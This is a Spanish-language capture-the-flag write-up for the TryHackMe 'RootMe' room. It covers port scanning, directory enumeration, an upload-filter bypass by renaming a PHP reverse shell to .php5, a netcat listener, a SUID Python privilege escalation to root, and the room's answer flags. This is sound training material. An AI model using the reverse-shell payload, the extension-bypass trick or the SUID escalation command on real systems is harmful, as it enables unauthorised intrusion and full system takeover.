# Writeup RootMe - TryHackMe

| **Información** | **Detalle** |
| :--- | :--- |
| **IP** | `10.130.151.157` |
| **Plataforma** | TryHackMe |
| **Sistema Operativo** | Linux |
| **Dificultad** | Fácil |

---

## Tabla de Contenidos

1. [Reconocimiento](#reconocimiento)
2. [Enumeración](#enumeración)
3. [Explotación](#explotación)
4. [Escalada de Privilegios](#escalada-de-privilegios)
5. [Flags](#flags)

---

## Reconocimiento

Iniciamos la fase de reconocimiento con un escaneo de puertos inicial para mapear los servicios expuestos:

```bash
sudo nmap -sC -sV -Pn -sS -p- 10.130.151.157 -oN scan_root.txt
```
```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.41
```

> Podemos ver que en esta máquina solo tenemos abierto dos puertos, HTTP y SSH. Ahora, vamos a usar GoBuster para ver que directorios ocultos tenemos.

---

## Enumeración

[CONTENIDO DE ENUMERACIÓN]

```bash
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -url http://10.130.151.157
```

![gobuster](/imgRoot/image.png)

Podemos ver que hemos encontrado unos cuantos directorios, y al parecer el código es PHP, por lo que podemos buscar un exploit para poder acceder a la máquina usando una vulnerabilidad de PHP de subida arbitraria.

---

## Explotación

Para conseguir explotar la máquina y acceder a ella, usaremos un archivo PHP malicioso para permitirnos tener una shell remota en la máquina. En este caso, usaremos un archivo PHP que hemos descargado para conseguir nuestro objetivo. (https://pentestmonkey.net/tools/web-shells/php-reverse-shell)


```bash
set_time_limit (0);
$VERSION = "1.0";
$ip = '192.168.130.81';  // CHANGE THIS
$port = 4444;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
```

![error](/imgRoot/image2.png)

Vale, al intentar subir el PHP al sitio web, nos ha dado un error de que no está permitido el archivo con extensión .php, por lo que tenemos que ponernos más creativos para conseguir nuestro objetivo. Simplemente, vamos a renombrar la extensión de nuestro archivo a PHP5, ya que el servidor está filtrado para que no se pueda subir archivos PHP.

¡Perfecto! El truco de cambiar la extensión ha funcionado correctamente, por lo que podemos ir a la sección de "uploads" para interactuar con el archivo y conseguir nuestra shell remota.

![shell](/imgRoot/image3.png)

Pero antes de hacer clic en nada, vamos a poner nuestro netcat en modo escucha para poder recibir la conexión.

```bash
sudo nc -lvnp 4444
```

Se ha establecido la conexión con éxito. Hemos obtenido acceso como el usuario `www-data`. 

*Nota: La shell obtenida no es una TTY completa (no interactiva), lo que limita algunas funcionalidades del terminal. Sin embargo, es suficiente para proceder con la búsqueda de la flag y la posterior escalada de privilegios.*

```bash
onnect to [192.168.130.81] from (UNKNOWN) [10.130.151.157] 35062
Linux ip-10-130-151-157 5.15.0-139-generic #149~20.04.1-Ubuntu SMP Wed Apr 16 08:29:56 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
 08:15:09 up 24 min,  0 users,  load average: 0.00, 0.00, 0.08
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ find / -type f -name user.txt 2> /dev/null
/var/www/user.txt
$ cat /var/www/user.txt
THM{y0u_g0t_a_sh3ll}

```
---

## Escalada de Privilegios

Ahora, teniendo en cuenta las limitaciones de la shell revesa que tenemos, vamos a buscar una forma de escalar privilegios para poder acceder a la flag de root, empezando por mirar archivos extraños en el sistema con permisos de root

```bash
find / -type f -user root -perm -u=s 2>/dev/null
```

![find](/imgRoot/image4.png)

Podemos ver de que Python 2.7 tiene permisos de root, por lo que podemos intentar usarlo para escalar privilegios. Para ello, usaremos la herramienta "gtfobins" para saber que comando podemos utilizar para aprovechar esta vulnerabilidad.

![gtfobins](/imgRoot/image5.png)

```bash
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```
¡Tenemos una shell como root dentro de la máquina! Como sigue sin ser interactiva, usaremos el comando find para encontrar la flag de root.

```bash
find / -type f -name root.txt 2> /dev/null
```

![root](/imgRoot/image6.png)

---

## Flags

- **User Flag**: THM{y0u_g0t_a_sh3ll}
- **Root Flag**: THM{pr1v1l3g3_3sc4l4t10n}

